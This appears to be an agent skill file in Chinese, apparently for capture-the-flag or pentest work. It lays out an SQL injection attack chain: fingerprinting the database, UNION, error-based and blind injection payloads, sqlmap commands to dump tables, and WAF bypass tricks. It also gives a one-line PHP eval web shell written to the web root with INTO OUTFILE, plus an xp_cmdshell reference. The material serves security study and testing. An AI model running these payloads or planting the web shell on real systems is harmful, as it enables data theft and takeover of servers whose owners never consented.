---
name: sql注入攻击链
description: Use when encountering sql注入思维链 - 类型判断、注入技术、提权、写shell
---

# SQL注入攻击链

## Info

- **Domain**: web
- **Tags**: web, sqli

# SQL注入思维链

```
类型判断 → 字符型/数字型/搜索型/JSON型
      ↓
注入技术 → UNION/报错/盲注/堆叠
      ↓
获取数据 → 数据库→表→列→数据
      ↓
提权/写Shell → INTO OUTFILE/udf/堆叠执行
```

---

## 类型判断

| 数据库 | 判断方式 |
|--------|----------|
| MySQL | `version()` `@@version` `sleep()` |
| MSSQL | `@@version` `WAITFOR DELAY` |
| PostgreSQL | `version()` `pg_sleep()` |
| Oracle | `v$version` `UTL_HTTP` |
| SQLite | `sqlite_version()` |

**注入点闭合**: `'` `"` `'` `)` `'))` 等

---

## 注入技术选择

| 场景 | 技术 |
|------|------|
| 有回显 | UNION注入 |
| 有报错 | 报错注入(extractvalue/updatexml) |
| 无回显 | 布尔盲注/时间盲注 |
| 支持堆叠 | 堆叠查询执行多条SQL |

---

## UNION注入

```
1. 确定列数: ORDER BY N
2. 找回显位: UNION SELECT 1,2,3...
3. 获取信息: database()/version()/user()
4. 查表: information_schema.tables
5. 查列: information_schema.columns
6. 获取数据: SELECT col FROM table
```

---

## 报错注入

**MySQL**:
- `extractvalue(1,concat(0x7e,(SELECT...)))`
- `updatexml(1,concat(0x7e,(SELECT...)),1)`
- `floor(rand(0)*2)` group by报错

---

## 盲注技巧

**布尔盲注**: 根据页面差异逐字符猜解
**时间盲注**: 根据响应时间判断

**自动化**: sqlmap
```bash
sqlmap -u url --dbs
sqlmap -u url -D db --tables
sqlmap -u url -D db -T table --dump
```

---

## 写Shell

**MySQL**: `SELECT '<?php eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/s.php'`

**条件**:
- secure_file_priv为空或指定目录
- 知道网站绝对路径
- 有写权限

**MSSQL**: `xp_cmdshell执行命令`

---

## WAF绕过

| 方法 | 示例 |
|------|------|
| 大小写 | SeLeCt |
| 编码 | URL/Hex/Base64 |
| 注释 | `/*!50000select*/` |
| 空白符 | `%09 %0a %0d` |
| 函数替代 | mid()代替substr() |